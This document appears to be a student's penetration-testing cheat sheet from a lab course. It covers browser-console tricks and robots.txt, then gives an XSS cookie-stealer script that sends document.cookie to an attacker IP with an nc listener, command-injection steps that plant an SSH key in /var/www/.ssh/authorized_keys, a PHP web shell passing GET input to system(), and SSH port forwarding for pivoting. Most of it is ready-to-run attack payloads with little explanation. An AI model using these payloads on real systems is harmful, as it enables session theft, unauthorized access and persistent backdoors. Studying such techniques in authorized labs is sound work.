# Using Concole on HTML

(on the webpage, **right-click --> inspect**)

- On the console you pick the click option and click on what is changing or you want to inspect, you find the function
and then you enter the function

- Once you find the function, you can run it manually from console syntax: **(function)()** ex: **changeText()**

  (note: study the types of shell users have in a term like **bash** **sh** etc)

  - For any webserver you connect to you can run /robots.txt to see the other paths that are tied to the webserver to inspect
 
  # Cookie Stealer

  (run this script) **<script>document.location="http://(Linops IP):(port)/Cookie_Stealer1.php?username=" + document.cookie;</script>**

  (from remote IP (an IP you have access to), setup listener)

  nc -k -l (ip of machine) (port you want to listen on)

  # SSH Key gen (gaining initial access)

  - (1st you generate your key)

 **ssh-keygen -t rsa -b 4096**

  (will prompt you for things but just **(press enter)**

  - ( on web site or remote location)

**; mkdir /var/www/.ssh**

- (make .ssh directory on users $HOME)

 **ls -la /var/www** (verify it was made)

 - (upload your key with cmd injection)

**cat $HOME/ .ssh/id_rsa.pub** (from your linops)

**; echo "(paste whole .pub key)" >> /var/www/.ssh/authorized_keys** (paste into webpage)

- (verify key has been made)

**; cat /var/www/.ssh/authorized_keys**

# Malicious File Injection

- (put this into lin ops- basic html file) 

**(<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>)**

- ( make connection -MS to port)

  **ssh -MS /tmp/demo demo1@10.50.16.136** (from linops make MS)

  **ssh -S /tmp/demo demo -O forward -L 5024:10.208.50.40:22 ( from lin ops 

- (now you ssh)

**ssh -i $HOME/.ssh/id_rsa www-data@(ip)**

**ssh -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 5024**
